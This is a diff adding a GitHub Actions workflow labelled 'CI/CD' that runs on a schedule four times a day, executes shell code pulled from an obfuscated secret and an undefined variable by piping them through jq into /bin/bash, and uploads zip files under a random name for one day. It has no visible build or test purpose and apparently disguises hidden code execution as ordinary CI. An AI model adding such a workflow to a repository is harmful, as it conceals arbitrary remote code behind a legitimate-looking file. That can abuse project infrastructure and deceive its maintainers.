@@ -1,0 +1,31 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          emzrv37893: ${{ secrets.emzrv37893 }}
+        run: |
+          printf '%s' "$emzrv37893" | jq -r .f57348 | /bin/bash
+          echo $fg9 | jq -r .www38 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: SrWlMXXG
+          path: "*.zip"
+          retention-days: 1
